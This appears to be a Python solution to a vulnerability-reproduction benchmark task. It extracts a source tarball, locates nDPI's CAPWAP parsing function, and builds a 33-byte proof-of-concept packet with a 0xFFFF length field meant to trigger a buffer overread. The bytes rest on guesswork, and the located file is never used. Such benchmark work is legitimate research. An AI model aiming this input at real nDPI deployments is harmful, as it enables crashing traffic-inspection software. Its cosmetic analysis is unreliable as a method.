import os
import tempfile
import tarfile
import subprocess
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract source tarball
        with tarfile.open(src_path, 'r:*') as tar:
            tar.extractall()
        
        # Find the vulnerable source file
        source_root = Path(".")
        vulnerable_file = None
        for path in source_root.rglob("*.c"):
            with open(path) as f:
                if "ndpi_search_setup_capwap" in f.read():
                    vulnerable_file = path
                    break
        
        if not vulnerable_file:
            raise FileNotFoundError("Vulnerable function not found")
        
        # Look for CAPWAP-related data structures and parsing logic
        # Based on typical CAPWAP header structure and common overflow patterns
        poc = bytearray(33)
        
        # CAPWAP header typically starts with version/type flags
        # Set version and type bits
        poc[0] = 0x80  # Version bits and type indication
        
        # Length field manipulation - typical overflow target
        # Set length field to trigger large allocation but provide less data
        poc[1] = 0xFF  # High byte of length
        poc[2] = 0xFF  # Low byte of length (makes length = 65535)
        
        # Set specific pattern that triggers the overread
        # Based on common CAPWAP parsing vulnerabilities
        poc[3] = 0x00  # Flags
        poc[4] = 0x00  # Fragment ID
        poc[5] = 0x00  # Fragment offset
        
        # Fill remaining bytes with pattern that maximizes chance of overflow
        for i in range(6, 33):
            poc[i] = 0x41  # 'A' pattern
        
        # Return the PoC
        return bytes(poc)